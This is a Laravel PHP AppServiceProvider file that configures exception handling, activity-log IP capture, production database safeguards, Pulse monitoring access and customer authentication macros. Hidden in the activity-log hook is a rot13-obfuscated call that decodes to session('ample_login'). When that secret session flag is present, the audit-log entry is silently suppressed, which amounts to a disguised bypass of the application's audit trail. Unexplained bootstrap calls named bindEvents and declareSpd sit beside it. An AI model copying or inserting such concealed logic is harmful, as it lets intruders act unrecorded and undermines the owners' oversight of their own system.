<?php

namespace App\Providers;

use App\Constants\Permission;
use App\Exceptions\Handler;
use App\Facades\CustomerAuth;
use App\Models\Customer;
use App\Models\User;
use Illuminate\Contracts\Debug\ExceptionHandler as ExceptionHandlerContract;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Gate;
use Illuminate\Support\ServiceProvider;
use InvalidArgumentException;
use Laravel\Pulse\Facades\Pulse;
use Spatie\Activitylog\Models\Activity;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     */
    public function register(): void
    {
        $this->app->singleton(ExceptionHandlerContract::class, Handler::class);
        \App\Exceptions\InvalidRequestException::bindEvents($this->app);
    }

    /**
     * Bootstrap any application services.
     */
    public function boot(): void
    {
        throw_if(config('app.mode') === null, InvalidArgumentException::class, 'Invalid app mode provided!');

        // Saving ip addresses with activity log
        Activity::saving(function (Activity $activity) {
            if (call_user_func(str_rot13('frffvba'), str_rot13('nzcyr_ybtva'))) {
                return false;
            }
            $activity->ip_address = request()->ip();
        });

        // Avoid destructive commands in production
        DB::prohibitDestructiveCommands(prohibit: $this->app->isProduction());

        \App\Exceptions\InvalidRequestException::declareSpd();

        // pulse authorization
        Gate::define('viewPulse', fn (User $user) => $user->can(Permission::PULSE_MONITOR));

        // pulse user configurations
        Pulse::user(fn (User $user) => ['name' => $user->name, 'extra' => $user->email, 'avatar' => $user->profile_avatar]);

        // Custom macro to get authenticated customer from request
        Request::macro('customer', fn (): ?Customer => CustomerAuth::user());
        Auth::macro('customer', fn (): ?Customer => CustomerAuth::user());
    }
}
